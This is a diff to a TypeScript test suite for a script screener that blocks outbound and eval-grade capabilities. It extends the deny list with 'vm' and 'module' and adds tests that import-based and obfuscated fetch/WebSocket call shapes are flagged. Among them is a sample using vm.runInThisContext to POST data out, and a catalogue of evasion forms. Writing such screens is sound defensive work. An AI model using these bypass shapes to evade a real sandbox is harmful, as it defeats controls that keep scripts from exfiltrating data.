@@ -154,11 +154,42 @@ test('screenScript: the deny list is exactly the locked capability set', () => {
   // classic covert one) joined — the screen's own charter ("make the easy
   // exfiltration attempts fail loudly") does not survive a deny list missing
   // the easiest channels.
+  // W15-M3 (v0.23): 'vm' and 'module' joined — the eval-grade execution
+  // seams that used to walk in through a CLEAN literal specifier
+  // (`vm.runInThisContext("fetch(...)")` passed every import regex and the
+  // global screen alike; createRequire is a documented residual escape, but
+  // the `node:module` DOOR it needs is statically sealable).
   assert.deepEqual(FORBIDDEN_CAPABILITIES, [
     'child_process', 'net', 'http', 'https', 'dgram', 'worker_threads',
     'cluster', 'dns', 'tls',
     'process', 'node:process',
+    'vm', 'node:vm',
+    'module', 'node:module',
   ])
+})
+
+test('W15-M3: node:vm and node:module are denied at the import door — no clean-literal eval', () => {
+  for (const source of [
+    "import vm from 'node:vm'",
+    "import vm from 'vm'",
+    "const vm = await import('node:vm')",
+    "require('vm')",
+    "import { createRequire } from 'node:module'",
+    "import { createRequire } from 'module'",
+    "const m = await import('module')",
+  ]) {
+    const { ok, findings } = screenScript(source)
+    assert.equal(ok, false, source)
+    assert.ok(findings.some(f => f.includes("'vm'") || f.includes("'module'")), `${source}: ${findings.join('; ')}`)
+  }
+  // The vm body this door used to let through: the script below screened
+  // clean end to end before W15-M3 — eval-tier power, zero findings.
+  const throughTheDoor = [
+    "import vm from 'node:vm'",
+    "vm.runInThisContext(\"fetch('https://example.test', { method: 'POST' })\")",
+  ].join('\n')
+  const { ok, findings } = screenScript(throughTheDoor)
+  assert.equal(ok, false, `the vm import must flag before the body is even read: ${findings.join('; ')}`)
 })
 
 test('H-31: cluster/dns/tls are screened like every other outbound module', () => {
@@ -202,6 +233,37 @@ test('H-31: the zero-import globals (fetch, WebSocket) are screened by their cal
   }
   // The exported list is the testable contract for the globals tier.
   assert.deepEqual(FORBIDDEN_GLOBALS, ['fetch', 'WebSocket'])
+})
+
+test('W15-M2: statically decidable global-call shapes are screened, not only the direct call', () => {
+  // H-31 matched only `name(` — every form below needs no runtime value the
+  // text cannot see, yet each used to sail past the screen (the charter's
+  // own bar is "make the easy variants fail loudly").
+  const shapes = [
+    ["const r = globalThis['fetch'](url)", 'computed member, single quotes'],
+    ['const r = globalThis["fetch"](url)', 'computed member, double quotes'],
+    ['const r = globalThis[`fetch`](url)', 'computed member, backticks'],
+    ['const w = new globalThis["WebSocket"](url)', 'computed member, new'],
+    ['const r = fetch?.(url)', 'optional call'],
+    ['const r = (0, fetch)(url)', 'indirect (comma-operator) call'],
+    ['const f = fetch\nconst r = f(url)', 'alias binding, fetch'],
+    ['const W = globalThis.WebSocket', 'alias binding, dotted globalThis'],
+  ] as const
+  for (const [source, how] of shapes) {
+    const { ok, findings } = screenScript(source)
+    assert.equal(ok, false, `${how}: ${source}`)
+    assert.ok(findings.some(f => f.includes('global') && f.includes(how === 'alias binding, fetch' || how === 'alias binding, dotted globalThis' ? 'alias' : 'form')), `${how}: ${findings.join('; ')}`)
+  }
+  // Boundary precision keeps both directions: identifiers merely CONTAINING
+  // the names, or aliasing something else entirely, stay allowed.
+  for (const source of [
+    'const v = prefetch(url)',
+    'const f = fetchAll',
+    'const f = refetch;\nconst r = f()',
+    "import { fetchFixture } from './fetch.mjs'",
+  ]) {
+    assert.equal(screenScript(source).ok, true, source)
+  }
 })
 
 test('screenScript: static imports are caught, with and without the node: prefix', () => {
